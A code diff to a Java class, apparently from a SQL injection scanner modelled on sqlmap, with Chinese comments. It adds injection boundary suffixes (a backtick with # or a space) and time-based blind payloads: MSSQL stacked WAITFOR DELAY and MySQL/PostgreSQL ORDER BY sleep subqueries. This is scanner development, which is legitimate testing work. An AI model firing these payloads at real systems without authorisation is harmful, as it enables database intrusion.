@@ -83,7 +83,13 @@ public final class SqlmapTimeModel {
             new Boundary("\"", "-- -", "双引号·注释"),
             new Boundary("'))", "-- -", "双层括号·注释"),
             new Boundary("'", " AND 'x'='x", "单引号·补全闭合"),
-            new Boundary("')", " AND ('x'='x", "单引号+括号·补全闭合")
+            new Boundary("')", " AND ('x'='x", "单引号+括号·补全闭合"),
+            // v4.1.1（P2-1）：吸收 xray 独有的绕过形态——反引号 + # 注释。
+            // 注意：/**/ 只能替代空格、不能当注释符（'/**/ 后原 SQL 的引号仍会闭合，
+            // 靶场实测不成立），它的价值在 clause 内部替代空格 → 由 QUICK 的
+            // "空格→/**/" 变体承担（level 2 启用），不作为 boundary 后缀。
+            new Boundary("`", "#", "反引号·#注释"),
+            new Boundary("`", " ", "反引号·空格")
     );
 
     /**
@@ -95,6 +101,16 @@ public final class SqlmapTimeModel {
             new TimeClause(" AND {R}=IF((1=1),SLEEP({S}),{R})", "MySQL", "mysql-if-sleep"),
             new TimeClause(" AND (SELECT {R} FROM pg_sleep({S}))", "PostgreSQL", "pg-sleep-select"),
             new TimeClause(" AND {R}=DBMS_PIPE.RECEIVE_MESSAGE('{C}',{S})", "Oracle", "oracle-pipe")
+    );
+
+    /**
+     * 独立子句（不套 boundary，本身就是完整语句或子句追加形态）：
+     * MSSQL 堆叠 WAITFOR、ORDER BY 逗号子查询（吸收 xray 的 ORDER 集独有能力）。
+     */
+    public static final List<TimeClause> STANDALONE_CLAUSES = List.of(
+            new TimeClause("; WAITFOR DELAY '0:0:{S}'-- -", "MSSQL", "mssql-waitfor-stacked"),
+            new TimeClause(",(select*from(select+sleep({S}))a)", "MySQL", "mysql-orderby-subq"),
+            new TimeClause(",(select 1 from pg_sleep({S}))", "PostgreSQL", "pg-orderby")
     );
 
     /**
